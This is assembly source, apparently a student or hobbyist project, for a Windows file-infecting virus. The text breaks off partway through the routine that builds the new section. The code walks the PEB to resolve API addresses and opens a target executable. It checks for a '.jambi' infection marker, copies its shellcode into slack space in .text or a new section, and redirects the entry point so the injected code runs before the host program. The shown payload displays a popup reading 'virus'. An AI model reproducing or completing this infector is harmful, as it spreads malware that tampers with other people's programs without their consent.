	.386
	.model flat, stdcall
	option casemap:none

	include		\masm32\include\ntstrsafe.inc
	include		\masm32\include\windows.inc
	include		\masm32\include\user32.inc
	include		\masm32\include\kernel32.inc
	include		\masm32\include\msvcrt.inc
	include		\masm32\include\shlwapi.inc

	includelib	\masm32\lib\msvcrt.lib
	includelib	\masm32\lib\user32.lib
	includelib	\masm32\lib\kernel32.lib
	includelib	\masm32\lib\masm32.lib
	includelib	\masm32\lib\shlwapi.lib
	include getdynamicfunc.asm
	.code
;; very_first:
	jmp start

	.const
	CRLF equ 13d, 10d
	JUMP equ 233d 		; 233d == E9 en hexa (jump)

	.data
	;; loli			byte    "-%d", CRLF, 0
	;; execpattern		db	"\*",0
	;; format_text		byte	"fichier: %s", CRLF, 0
	;; format_string		byte	"String : %s", CRLF, 0
	;; format_integer		byte	"%d", CRLF, 0
	;; format_pointer		byte	"pointer: %p", CRLF, 0
	;; format_short		byte	"%h", CRLF, 0
	;; format_char		byte	"_%c", CRLF, 0
	;; binary_noop		byte	144
	;; pause_command 		byte	"PAUSE", 0
	;; szWndTitle		byte	"~[popup'title]~", 0

	;; sectionName			byte		".jambi", 0
	;; sectionNameLength		dword		8

	;; error_StrDup			byte		"StrDup failed.", CRLF, 0
	;; error_CreateFile		byte		"CreateFile failed.", CRLF, 0
	;; error_CreateFileMapping		byte		"CreateFileMapping failed.", CRLF, 0
	;; error_MapViewOfFile		byte		"MapViewOfFile failed.", CRLF, 0
	;; error_PE_format			byte		"Incorrect PE file format", CRLF, 0
	;; error_Invalid_Handle_Value	byte		"Invalid Handle Value", CRLF, 0
	;; error_Invalid_Set_FP		byte		"Invalid Set File Pointer", CRLF, 0
	;; error_Write_File		byte		"Write File Failed",  CRLF, 0
	;; error_Close_Handle		byte		"Close handle failed", CRLF, 0
	;; error_Find_First_File		byte		"Find First File failed", CRLF, 0
	;; error_Find_Next_File		byte		"Find Next File failed", CRLF, 0
	;; error_Stack_Overflow		byte		"Stack Overflow", CRLF, 0

	;; ;FOR TEST DEBUG ONLY
	;; pattern		db	"address of Kernel32.dll  => %p", 13, 10, 0
	;; pattern2	db	"address of GetProcAddr => %p", 13, 10, 0
	;; pattern3	db	"address of LoaLibraryExA => %p", 13, 10, 0
	;; pattern4	db	"address of ExPortTable => %p", 13, 10, 0
	;; patternptr	db	"address of ptr => %p", 13, 10, 0
	;; patternMsgBox	db	"address of msgbox => %p", 13, 10, 0
	;; patternregister	db	"value of register => %d", 13, 10, 0
	;; patternuser32	db	"address user32 => %p", 13, 10, 0
	;; patternpebfail	byte	"zoh my gaude, peb failed", CRLF, 0

;!TEST_DEBUG

	.code

execpattern:
	db	"\*",0
szWndTitle:
	db	"~[popup'title]~", 0
sectionName:
	db	".jambi", 0
sectionNameLength:
	dword	8
my_format:
	db	"addr: %p size: %d", 13, 10, 0
loli:
format_text:
format_string:
format_integer:
format_pointer:
format_short:
format_char:
binary_noop:
pause_command:
error_StrDup:
error_CreateFile:
error_CreateFileMapping:
error_MapViewOfFile:
error_PE_format:
error_Invalid_Handle_Value:
error_Invalid_Set_FP:
error_Write_File:
error_Close_Handle:
error_Find_First_File:
error_Find_Next_File:
error_Stack_Overflow:
pattern:
pattern2:
pattern3:
pattern4:
patternptr:
patternMsgBox:
patternregister:
patternuser32:
patternpebfail:
	db 'random [error/txt/affichage]', 13, 10, 0

;; getdynamicfunc

;get the Kernel32 address stored in PEB
;IN	NOTHING
;OUT	eax:::KERNEL32ADDRESS : INT
;void* __stdcall__GetKernel32Address()
;; GetKernel32Address:
;; push	ebp
;; mov	ebp, esp

;; push	esi
;; xor	eax, eax
;; xor	esi, esi

;; assume	fs:nothing					; bypass masm protection
;; mov	eax, fs:[30h]					; PEB      TIB[30h] => Linear address of Process Environment Block (PEB)
;; mov	eax, [eax+0Ch]					; LOADER    aka _PEB_LDR_DATA
;; mov	esi, [eax+1Ch]					; InitializationOrderModuleList
;; lodsd
;; mov	eax, [eax+8]					; InInitializationOrderModuleList(3) <=> kernel32

;; pop	esi

;; mov	esp, ebp					;epilogue
;; pop	ebp						;epilogue
;; ret							;GetKernel32Address endp

;; ;get the export table in a dll wich contains  adresses of provided functions
;; ;IN	dllAddress : dword
;; ;OUT	eax::ExportTableAddress : dword
;; ;void* __stdcall__GetExportTableAddress(void *dllAddr)
;; GetExportTableAddress:
;; push	ebp
;; mov	ebp, esp

;; push	ebx
;; xor	ebx, ebx

;; mov	eax, [ebp+8]					;dllAddr<=>ImageBase
;; mov	ebx, [eax+3Ch]					; += RVA of  PE header
;; add	ebx, eax 					; == PE HEADER

;; mov	ebx, [ebx+78h]					; += IMAGE_EXPORT_DIRECTORY in PE HEADER
;; add	ebx, eax					; == ExportTable
;; mov	eax, ebx

;; pop	ebx

;; mov	esp, ebp					;epilogue
;; pop	ebp
;; ret	4						;GetExportTableAddress endp

;; ;	get the address of a function stored in a dll
;; ;IN	kernel32Addr : dword, exportTableAddress : dword, sAddrFuncName: dword
;; ;OUT	eax::FuncAddr : dword
;; ;void* __stdcall__GetFuncAddr(void* dllImageBase, void* exportTable, char* sAddrFuncName)
;; GetFuncAddr:
;; push	ebp
;; mov	ebp, esp

;; push	ebx
;; push	esi
;; push	edi

;; xor	eax, eax
;; xor	ebx, ebx
;; xor	ecx, ecx
;; xor	esi, esi
;; xor	edi, edi

;; mov	edx, [ebp+8]					;edx = dllImageBase
;; mov	ebx, [ebp+12]					;ebx = exportTable

;; mov	esi, [ebx+20h]					;table of "pointeurs de noms" (AddressOfNames) en rva
;; add	esi, edx					;+ ImageBase

;; FindFunc:						;seeking Function indice in AddressOfNAmes, store result in ecx
;; lodsd
;; add	eax, edx					;+ ImageBase because each NamesPointers addr are RVA
;; mov	edi, eax
;; push	esi
;; mov	esi, [ebp+16]					;sAddrFuncName

;; StringCmp:
;; cmpsb							;cmp byte ds:esi, byte ds:edi
;; jne	NextFunction
;; cmp	byte ptr [edi], 0
;; je	FuncFound
;; jmp	StringCmp

;; NextFunction:
;; pop	esi
;; inc	ecx
;; jmp	FindFunc
;; ;							;ordinalTable(ecx) == &Func
;; FuncFound:						;indice of Func is now in ecx
;; xor	eax, eax
;; mov	esi, [ebx+24h]					;&ordinalTable
;; shl	ecx, 1
;; add	esi, ecx
;; add	esi, edx
;; mov	ax, word ptr [esi]
;; shl	eax, 2
;; add	eax, [ebx+1Ch]
;; add	eax, edx
;; mov	ebx, [eax]
;; add	ebx, edx
;; mov	eax, ebx

;; pop	esi						;clear the stack

;; pop	edi
;; pop	esi
;; pop	ebx
;; mov	esp, ebp
;; pop	ebp
;; ret	12						;GetFuncAddr endp


;; @@sGetProcAddress:
;; db	"GetProcAddress", 0
;; @@sLoadLibraryExA:
;; db	"LoadLibraryExA", 0
;; @@sCreateFileA:
;; db	"CreateFileA", 0
;; @@sCreateFileMappingA:
;; db	"CreateFileMappingA", 0
;; @@sExitProcess:
;; db	"ExitProcess", 0
;; @@sFindFirstFileA:
;; db	"FindFirstFileA", 0
;; @@sGetCurrentDirectoryA:
;; db	"GetCurrentDirectoryA", 0
;; @@sstrcat:
;; db	"lstrcatA", 0
;; @@sMapViewOfFile:
;; db	"MapViewOfFile", 0
;; @@sSetFilePointer:
;; db	"SetFilePointer", 0
;; @@sUnmapViewOfFile:
;; db	"UnmapViewOfFile", 0
;; @@sWriteFile:
;; db	"WriteFile", 0
;; @@sUser32:
;; db	"User32", 0
;; @@sMessageBoxA:
;; db	"MessageBoxA", 0
;; @@smsvcrt:
;; db	"msvcrt", 0
;; @@smemcmp:
;; db	"memcmp", 0
;; @@smemcpy:
;; db	"memcpy", 0
;; @@sprintf:
;; db	"printf", 0
;; @@sstrcpy:
;; db	"strcpy", 0
;; @@sstrncmp:
;; db	"strncmp", 0
;; @@sShlwapi:
;; db	"Shlwapi", 0
;; @@sStrDupA:
;; db	"StrDupA", 0
;; @@sCloseHandle:
;; db	"CloseHandle", 0
;; @@sFindNextFileA:
;; db	"FindNextFileA", 0

;; peb:

;; call	GetKernel32Address
;; mov	[ebp - 200], eax	; saving &kernel32

;; push	[ebp - 200]
;; call	GetExportTableAddress
;; mov	[ebp - 204], eax					; saving &exportTable

;; ;GetFuncAddr(&kernel32, &exportTable, "GetProcAddress")
;; lea	eax, @@sGetProcAddress
;; push	eax
;; push	[ebp - 204]
;; push	[ebp - 200]
;; call	GetFuncAddr

;; mov    [ebp - 212], eax						;saving GetProcAddr

;; ;GetFundAddr(&kernel32, &exportTable, "LoadLibraryExA")
;; lea	eax, @@sLoadLibraryExA
;; push	eax
;; push	[ebp - 204]
;; push	[ebp - 200]
;; call	GetFuncAddr
;; mov	[ebp - 208], eax


;; ;LoadLibraryExA("User32", 0, 0);
;; push	0
;; push	0
;; push	@@sUser32
;; mov	eax, [ebp - 208]
;; call	eax
;; mov	[ebp - 216], eax					;saving user32.dll

;; or	eax, eax
;; jz	_error14


;; ;GetProcAddress(&User32, "MessageBoxA")
;; push	@@sMessageBoxA
;; push	[ebp - 216]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 268], eax					;saving MessageBoxA

;; or	eax, eax
;; jz	_error14

;; ;GetProcAddress(&kernel32, "CreateFileA")
;; push	@@sCreateFileA
;; push	[ebp - 200]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 228], eax

;; or	eax, eax
;; jz	_error14

;; ;GetProcAddress(&kernel32, "CreateFileMappingA")
;; push	@@sCreateFileMappingA
;; push	[ebp - 200]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 232], eax

;; or	eax, eax
;; jz	_error14

;; ;GetProcAddress(&kernel32, "ExitProcess")
;; push	@@sExitProcess
;; push	[ebp - 200]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 236], eax

;; or	eax, eax
;; jz	_error14

;; ;[ebp-240] =GetProcAddress(&kernel32, "FindFirstFileA")
;; push	@@sFindFirstFileA
;; push	[ebp - 200]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 240],eax

;; or	eax, eax
;; jz	_error14

;; ;[ebp-244] = GetProcAddress(&kernel32, "GetCurrentDirectoryA")
;; push	@@sGetCurrentDirectoryA
;; push	[ebp - 200]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 244], eax

;; or	eax, eax
;; jz	_error14

;; ; GetProcAddress(&kernel32, "MapViewOfFile")
;; push	@@sMapViewOfFile
;; push	[ebp - 200]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 252], eax

;; or	eax, eax
;; jz	_error14

;; ; GetProcAddress(&kernel32, "SetFilePointer")
;; push	@@sSetFilePointer
;; push	[ebp - 200]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 256], eax

;; or	eax, eax
;; jz	_error14

;; ; GetProcAddress(&User32, "UnmapViewOfFile")
;; push	@@sUnmapViewOfFile
;; push	[ebp - 200]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 260], eax

;; or	eax, eax
;; jz	_error14

;; ; GetProcAddress(&User32, "WriteFile")
;; push	@@sWriteFile
;; push	[ebp - 200]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 264], eax

;; or	eax, eax
;; jz	_error14


;; ;LoadLibraryExA("msvcrt", 0, 0);
;; push	0
;; push	0
;; push	@@smsvcrt
;; mov	eax, [ebp - 208]
;; call	eax
;; mov	[ebp - 220], eax	;saving msvcrt.dll

;; or	eax, eax
;; jz	_error14

;; ; GetProcAddress(&msvcrt, memcmp)
;; push	@@smemcmp
;; push	[ebp - 220]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 272], eax

;; or	eax, eax
;; jz	_error14

;; ; GetProcAddress(&msvcrt,memcpy)
;; push	@@smemcmp
;; push	[ebp - 220]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 276], eax

;; or	eax, eax
;; jz	_error14

;; ; GetProcAddress(&msvcrt, printf)
;; push	@@sprintf
;; push	[ebp - 220]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 280], eax

;; or	eax, eax
;; jz	_error14

;; ; GetProcAddress(&??, "strcat")
;; push	@@sstrcat
;; push	[ebp - 200]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 248], eax

;; or	eax, eax
;; jz	_error14

;; ; GetProcAddress(&msvcrt, strcpy)
;; push	@@sstrcpy
;; push	[ebp - 220]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 284], eax

;; or	eax, eax
;; jz	_error14

;; ; GetProcAddress(&msvcrt, strncmp)
;; push	@@sstrncmp
;; push	[ebp - 220]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 288], eax

;; or	eax, eax
;; jz	_error14

;; ;LoadLibraryExA("Shlwapi", 0, 0);
;; push	0
;; push	0
;; push	@@sShlwapi
;; mov	eax, [ebp - 208]
;; call	eax
;; mov	[ebp - 224], eax					;saving Shlwapi.dll

;; or eax, eax
;; jz _error14

;; ; GetProcAddress(&msvcrt,StrDupA)
;; push	@@sStrDupA
;; push	[ebp - 224]
;; mov	eax, [ebp - 212]
;; call	eax
;; mov	[ebp - 292], eax

;; or	eax, eax
;; jz	_error14

;; ; CloseHandle
;; push 	@@sCloseHandle
;; push	[ebp - 200]	 					;kernel32
;; call	dword ptr [ebp - 212]					;GetProcAdress
;; mov	[ebp - 296], eax

;; or	eax, eax
;; jz	_error14

;; ; FindNextFile
;; push 	@@sFindNextFileA
;; push	[ebp - 200]	 					;kernel32
;; call	dword ptr [ebp - 212]					;GetProcAdress
;; mov	[ebp - 300], eax

;; or	eax, eax
;; jz	_error14


;; jmp	dword ptr [ebp - 196]

;; @@lola:
;; 	db	"~[popup'title]~", 0
;; @@lili:
;; 	mov	[ebp - 196], @@ici
;; 	jmp	peb
;; @@ici:
;; 	push	0
;; 	push	offset	@@lola
;; 	push	offset	@@lola
;; 	push	0
;; 	call	dword ptr [ebp - 268]

;; db	233d

;; END of getdynamicfunc


;; very_first:	
beg_sh:
	jmp @@vars
	@@here:
	xor	eax, eax
	pop	ebx

	push	ebx			; LoadLibraryA()
	mov	edx, 7c801d7bh
	call	edx

	xor	ecx, ecx
	mov	cl,  11
	add	ebx, ecx		; GetProcAddress()
	push	ebx
	push	eax
	mov	edx, 7c80ae30h
	call	edx

	xor	edx, edx		; popup()
	push	edx			; icone
	xor	ecx, ecx
	mov	cl,  12
	add	ebx, ecx		; title
	push	ebx
	xor	ecx, ecx
	mov	cl,  6
	add	ebx, ecx		; text
	push	ebx
	push	edx
	call	eax

	jmp short @@sortie

	@@vars:
	call	@@here
	db	'user32.dll',0		; 0
	db	'MessageBoxA',0		; +11
	db	'virus',0		; +23
	db	'loli owns da world !',0	; +29
	@@sortie:
	db	JUMP
end_sh:
;; very_last:

get_sh:
	;; mov	ebx, end_sh
	;; mov	eax, beg_sh
	mov	ebx, very_last
	mov	eax, very_first

	 			; eax contiens beg
	sub	ebx, eax	; ebx contiens strlen(sh)

	ret

	_error0:
	push	offset error_StrDup
	push	offset format_string
	call	dword ptr [ebp - 280]
	leave
	ret	4

	_error1:
	push	offset	error_CreateFile
	push	offset	format_string
	call	dword ptr [ebp - 280]
	leave
	ret	4

	_error2:
	push	offset	error_CreateFileMapping
	push	offset format_string
	call	dword ptr [ebp - 280]
	push	[ebp - 4]
	call 	dword ptr [ebp - 296]
	leave
	ret	4

	_error3:
	push	offset error_MapViewOfFile
	push	offset format_string
	call	dword ptr [ebp - 280]
	mov	edx, [ebp + 8]
	push	edx
	push	offset format_text
	call	dword ptr [ebp - 280]
	push	[ebp - 4]
	call	dword ptr [ebp - 296]
	push	[ebp - 8]
	call	dword ptr [ebp - 296]
	leave
	ret	4

	_error4:
	push	offset error_PE_format
	push	offset format_string
	call	dword ptr [ebp - 280]
	leave
	ret	4

	_error5:
	push	offset error_PE_format
	push	offset format_string
	call	dword ptr [ebp - 280]
	leave
	ret	4

	_error6:
	push	offset error_Invalid_Handle_Value
	push	offset format_string
	call	dword ptr [ebp - 280]
	leave
	ret	4

	_error7:
	push	offset error_Invalid_Set_FP
	push	offset format_string
	call	dword ptr [ebp - 280]
	leave
	ret	4

	_error8:
	push	offset error_Write_File
	push	offset format_string
	call	dword ptr [ebp - 280]
	leave
	ret	4

	_error9:
	push	offset error_Close_Handle
	push	offset format_string
	call	dword ptr [ebp - 280]
	leave
	ret	4

	_error10:
	push	offset error_Close_Handle
	push	offset format_string
	call	dword ptr [ebp - 280]
	leave
	ret	4

	_error11:
	push	offset error_Find_First_File
	push	offset format_string
	call	dword ptr [ebp - 280]
	leave
	ret	16

	_error12:
	;; push	offset error_Find_Next_File
	;; push	offset format_string
	;; call	dword ptr [ebp - 280]       ; pas set dans ce scope
	push	12
	call	dword ptr [ebp + 16]        ; ExitProcess

	_error13:
	push	offset error_Stack_Overflow
	push	offset format_string
	call	dword ptr [ebp - 280]
	leave
	ret	4

	_error14:	;PEB failed
	push	offset patternpebfail
	call	dword ptr [ebp - 280]

	debug_popup:
	push	ebp
	mov	ebp, esp

	push	MB_ICONWARNING
	push	offset	szWndTitle
	push	[ebp + 8]
	push	0
	call	dword ptr [ebp - 268]

	leave
	ret

	debug_iprintf:
	push	ebp
	mov	ebp, esp

	mov	eax, [ebp + 8]
	push	eax
	push	offset format_integer
	call	dword ptr [ebp - 280]

	leave
	ret	4

	debug_sprintf:
	push	ebp
	mov	ebp, esp

	mov	eax, [ebp + 8]
	push	eax
	push	offset format_string
	call	dword ptr [ebp - 280]

	leave
	ret	4

	debug_pprintf:
	push	ebp
	mov	ebp, esp

	mov	eax, [ebp + 8]
	push	eax
	push	offset format_pointer
	call	dword ptr [ebp - 280]

	leave
	ret	4

	debug_cprintf:
	push	ebp
	mov	ebp, esp

	mov	eax, [ebp + 8]
	push	eax
	push	offset format_char
	call	dword ptr [ebp - 280]

	leave
	ret	4

	test_crt_strcpy:
	push	ebp
	mov	ebp, esp

	sub	esp, 512
	mov	ebx, ebp
	sub	ebx, 512

	push	offset sectionName
	push	ebx
	call	dword ptr [ebp - 284]

	push	ebx
	push	ebx
	push	offset format_string
	call	dword ptr [ebp - 280]

	leave
	ret

is_zero_long:			;is_zero_long(chaine, taille)
	push	ebp
	mov	ebp, esp

	mov	edx, [ebp + 8]	;chaine
	mov	ecx, [ebp + 12]	;taille
	xor	eax, eax
o1:
	cmp	[edx], eax
	jne	o2
	dec	ecx
	inc	edx
	loop	o1
	dec	eax
o2:
	inc	eax
	leave
	ret	8


				; alignment => ebp + 8
				; value => ebp + 12
alignment:
	push	ebp
	mov	ebp, esp

	xor	edx, edx
	mov	eax, [ebp + 12]
	mov	ecx, [ebp + 8]

	div	ecx

	or	edx, edx
	je	alignment_done

	inc	eax
	imul	eax, [ebp + 8]

	jmp	alignment_exit

	alignment_done:
	mov	eax, [ebp + 12]

	alignment_exit:
	leave
	ret	8

	;Prototype: isHealthy(number of sections, PIMAGE_NT_HEADERS)
	isHealthy:
	push	ebp
	mov	ebp, esp

	sub	esp, 4

	mov	ecx, [ebp + 8]
	mov	ebx, [ebp + 12]

	add	ebx, 248

	isHealthy_loop:
	or	ecx, ecx
	je	isHealthy_endloop

	mov	[ebp - 4], ecx

	push	7
	push	offset sectionName
	push	ebx
	;; call	crt_strncmp
	call	dword ptr [ebp + 16]

	or	eax, eax
	je	already_infected

	mov	ecx, [ebp - 4]

	add	ebx, 40
	dec	ecx
	jmp	isHealthy_loop

	already_infected:
	mov	eax, 0
	jmp	isHealthy_end

	isHealthy_endloop:
	mov	eax, 1

	isHealthy_end:
	leave
	ret		12

infect:
	push	ebp
	mov	ebp, esp

	;---------------------------------------------------------------------------------
	; EBP					4
	;---------------------------------------------------------------------------------
	; HANDLE				4	return of CreateFile
	; HANDLE				8	return of CreateFileMapping
	; LPVOID 				12	return of MapViewOfFile
	; PIMAGE_NT_HEADERS			16
	; PIMAGE_SECTION_HEADER			20
	; DWORD					24	OptionalHeader.AddressOfEntryPoint
	; DWORD					28	OptionalHeader.SectionAlignment
	; DWORD					32	OptionalHeader.FileAlignment
	; HANDLE				36	return of CreateFile
	; DWORD					40	pointerToRawData
	; DWORD					44
	; 					48
	; DWORD					52	&payload
	; DWORD					56	payload_size
	; DWORD					60	payload_size + 4

	;---------------------------------------------------------------------------------
	; Our section
	;---------------------------------------------------------------------------------
	; PSECTION->Misc.VirtualSize		8	dword
	; PSECTION->VirtualAddress		12	dword
	; PSECTION->SizeOfRawData		16	dword
	; PSECTION->PointerToRawData		20	dword
	; PSECTION->PointerToRelocations	24	dword
	; PSECTION->PointerToLinenumbers	28	dword
	; PSECTION->NumberOfRelocations		32	dword
	; PSECTION->NumberOfLinenumbers		34	word
	; PSECTION->Characteristics		36	word
	;---------------------------------------------------------------------------------
	; PEB + dynamic funcs [200-292]
	;---------------------------------------------------------------------------------
	; HANDLE				200	Kernel32.dll
	; HANDLE				204	Kernel32 exportTable
	; HANDLE 				208	LoadLibraryA
	; HANDLE				212	GetProcAddr
	;---------------------------------------------------------------------------------
        ; DLLS
	;---------------------------------------------------------------------------------
	; HANDLE				216	User32
	; HANDLE				220	msvcrt.dll
	; HANDLE				224	Shlwapi.dll
	;---------------------------------------------------------------------------------
	; Kernel32 Functions
	;---------------------------------------------------------------------------------
	; HANDLE				228	CreateFileA
	; HANDLE				232	CreateFileMappingA
	; HANDLE				236	ExitProcess
	; HANDLE				240	FindFirstFileExA
	; HANDLE				244	GetCurrentDirectoryA
	; HANDLE				248	lstrcat
	; HANDLE				252	MapViewOfFile
	; HANDLE				256	SetFilePointer
	; HANDLE				260	UnmapViewOfFile
	; HANDLE				264	WriteFile
	;---------------------------------------------------------------------------------
	; User32 Functions
	;---------------------------------------------------------------------------------
	; HANDLE				268	MessageBoxA
	;---------------------------------------------------------------------------------
	; msvcrt Functions
	;---------------------------------------------------------------------------------
	; HANDLE				272	memcmp
	; HANDLE				276	memcpy
	; HANDLE				280	printf
	; HANDLE				284	strcpy
	; HANDLE				288	strncmp
	;---------------------------------------------------------------------------------
	; Shlwapi.dll Functions
	;---------------------------------------------------------------------------------
	; HANDLE				292	StrDupA
	;---------------------------------------------------------------------------------

	sub	esp, 512

	mov	[ebp - 196], code_begin ; addr de retour
	jmp	peb
code_begin:

	call	get_sh
	;; invoke crt_printf, offset my_format, eax, ebx
	mov	[ebp  - 52], eax
	mov	[ebp  - 56], ebx
	add	ebx, 4
	mov	[ebp  - 60], ebx ; TOTAL size = shellcode size + jump size

;; 	push	eax
;; 	call	debug_iprintf

;; 	push	ebx
;; 	call	debug_iprintf

;; 	invoke	ExitProcess, 0

	;;;;; CreateFile seem fucking up [ebp + 8] after loop 1
	push	[ebp + 8] ;;;;; Copying [ebp + 8]
	call	dword ptr [ebp - 292]
	cmp	eax, NULL
	je	_error0

	push	eax ;;;;; Saving [ebp + 8]

	; CreateFile
	push	0
	push	0
	push	OPEN_EXISTING
	push	NULL
	push	FILE_SHARE_READ or FILE_SHARE_WRITE
	push	GENERIC_READ or GENERIC_WRITE
	push	[ebp + 8]
	call	dword ptr [ebp - 228]

	pop	ecx ;;;;; Resoring [ebp + 8] saved before
	mov	[ebp + 8], ecx

	cmp	eax, INVALID_HANDLE_VALUE
	je	_error1

	mov	[ebp - 4], eax

	; CreateFileMapping
	push	NULL
	push	0
	push	0
	push	PAGE_READWRITE
	push	NULL
	push	eax
	call	dword ptr [ebp - 232]

	cmp	eax, NULL
	je	_error2

	mov	[ebp - 8], eax

	; MapViewOfFile
	push	0
	push	0
	push	0
	push	FILE_MAP_ALL_ACCESS
	push	eax
	call	dword ptr [ebp - 252]

	cmp	eax, NULL
	je	_error3

	mov	[ebp - 12], eax

	mov	edx, [eax]

	; acces au champs e_magic
	cmp	dx, IMAGE_DOS_SIGNATURE
	jne	_error4

	; infosExecutable + infosExecutable->e_lfanew
	add	eax, 60

	; recupere la valeur du long (e_lfanew)
	mov	edx, [eax]

	; recupere l'addresse du PIMAGE_DOS_HEADER
	sub	eax, 60

	; ajoute l'offset pour recuperer l'addresse du PIMAGE_NT_HEADERS
	add	eax, edx

	mov	edx, [eax]

	; acces au champs Signature
	cmp	edx, IMAGE_NT_SIGNATURE
	jne	_error5

	; saving PIMAGE_NT_HEADERS
	mov	[ebp - 16], eax

	; sizeof IMAGE_NT_HEADERS <=> 248
	; sizeof IMAGE_SECTION_HEADER <=> 40
	add	eax, 6

	; accessing number of sections
	xor	ecx, ecx
	mov	cx, [eax]

	mov	edx, ecx ; LEFLOU PATCH :  saving number of sections for calling isHealthy

	sub	eax, 6

	; number of sections * IMAGE_SECTION_HEADER
	imul	ecx, 40
	add	ecx, eax

	add	ecx, 248

	; PIMAGE_SECTION_HEADER
	mov	[ebp - 20], ecx

	;~~~~~~~~~~~~~~~~~~~~
	; Check if the binary is healthy
	;~~~~~~~~~~~~~~~~~~~~
	push	[ebp - 288]
	push	[ebp - 16]
	push	edx
	call	isHealthy

	or	eax, eax
	jne	checking_space

	mov	eax, 1 ; infection failed.

	leave
	ret	4

	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	; checking space
	;~~~~~~~~~~~~~~~~~~~~~~~~~~

	checking_space:
	mov	edx, [ebp - 20]

	push	40
	push	edx
	call	is_zero_long

	or	eax, eax
	je 	proceed_to_infection

	mov	ebx, [ebp - 12]

	mov	edx, [ebp - 16]
	add	edx, 52 ; offset to ImageBase
	mov	eax, [edx]
	sub	edx, 12 ; offset to AddressOfEntryPoint
	add	eax, [edx]
	mov	[ebp - 24], eax ; stocking REAL AddressOfEntryPoint

	; getting max addr to paste shellcode (staying in .text)
	mov	eax, [ebp - 16]
	add	eax, 248 ; Goto first section header
	add	eax, 40 ; Goto next section header
	mov	eax, [eax + 20] ; PointerToRawData value
	add	eax, [ebp - 12] ; addr of MZ
	sub	eax, 122
	mov	[ebp - 48], eax

	check_zero_loop:
	inc	ebx

	; on verif que cest pas deja infecte
	;lal
	mov	eax, [ebp  - 56]
	push	eax    ; la taille du pload sans le jump
	push	[ebp - 52]
	push	ebx
	call	dword ptr [ebp - 272]

	or	eax, eax
	je	end_injection

	; sinon on check si ya assez de place pour se caler.
	mov	eax, [ebp  - 60]
	add	eax, 6
	push	eax
	push	ebx
	call	is_zero_long

	or	eax, eax
	je	proceed_to_injection

	cmp	ebx, [ebp - 48]
	jb	check_zero_loop ; si on est encore dans TEXT !!!

	jmp	end_injection

	proceed_to_injection:
	add	ebx, 5    ; pour pas ecraser un null terminator
	mov	eax, [ebp  - 56]

	push	eax
	push	[ebp - 52]
	push	ebx
	call	dword ptr [ebp - 276]; copy shellcode

	; on calcule = ancien ep - present ep - (taille shellcode + jmp + addr)
	mov 	eax, ebp
	sub 	eax, 24
	mov	ecx, ebx
	sub	ecx, [ebp - 12]
	mov	edx, [ebp - 16]
	add	edx, 52 ; offset to ImageBase
	add	ecx, [edx]
	push	eax ; point to ebp -24
	mov	eax, [eax]
	sub	eax, ecx
	sub	eax, [ebp - 60]		; taille shellcode + jump + adresse du jump
	mov	[ebp - 24], eax
	pop	eax ; point to ebp - 24

	; on le concatene a notre shellcode
	add	ebx, [ebp - 56]
	push	4
	push 	eax ; adresse de l'offset pour le jump to roiginal entry point
	push	ebx
	call	dword ptr [ebp - 276]; copy shellcode

	sub	ebx, [ebp - 56]

	; On set l'entry point
	mov	edx, [ebp - 16]
	add	edx, 40 ; offset to AddressOfEntryPoint
	sub	ebx, [ebp - 12]
	mov	[edx], ebx

	end_injection:
	push	[ebp - 12]
	call	dword ptr [ebp - 260]

	push	[ebp - 8]
	call	dword ptr [ebp - 296]
	cmp	eax, 0
	je	_error9

	push	[ebp - 4]
	call	dword ptr [ebp - 296]
	cmp	eax, 0
	je	_error9

	leave
	ret 	4

	proceed_to_infection:
	;~~~~~~~~~~~~~~~~~~~
	; increment number of sections
	;~~~~~~~~~~~~~~~~~~~
	mov	edx, [ebp - 16]
	add	edx, 6

	xor	ecx, ecx
	mov	cx, [edx]
	inc	cx
	mov	[edx], ecx

	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	; Increasing OptionalHeader.SizeOfImage
	; payload_size is the new section size
	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	mov	edx, [ebp - 16]
	add	edx, 80

	mov	ecx, [edx]

	mov	eax, [ebp  - 60]
	add	cx, ax
	mov	[edx], ecx

	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	; Retrieving	AddressOfEntryPoint
	; 					SectionAlignment
	; 					FileAlignment
	; from PIMAGE_NT_HEADERS
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	mov	ebx, [ebp - 16]
	add	ebx, 52 ; offset to ImageBase
	mov	edx, [ebx]

	sub	ebx, 12 ; offset to AddressOfEntryPoint
	mov	ecx, [ebx]

	add	edx, ecx
	mov	[ebp - 24], edx ; stocking REAL AddressOfEntryPoint

	add	ebx, 16 ; offset to SectionAlignment
	mov	edx, [ebx]
	mov	[ebp - 28], edx

	add	ebx, 4 ; offset to FileAlignment
	mov	edx, [ebx]
	mov	[ebp - 32], edx

	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	; Creating new section
	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	mov	edx, [ebp - 20]

	push	offset sectionName
	push	edx
	call 	dword ptr [ebp - 284]

	; Setting our section datas
	mov	ebx, [ebp - 20]
	; Setting Misc.VirtualSize -> AligneSur(sectionAlignment,tailleSection);
	;push payload_size ; shell code size + dword jump to old entry point

	mov	eax, [ebp  - 60]
	push	eax
	push	[ebp - 28]
	call	alignment

	add	ebx, 8 ; Goto Misc.VirtualSize
	mov	[ebx], eax

	; Setting VirtualAddress -> AligneSur(sectionAlignment,(infosSection->VirtualAddress + infosSection->Misc.VirtualSize));
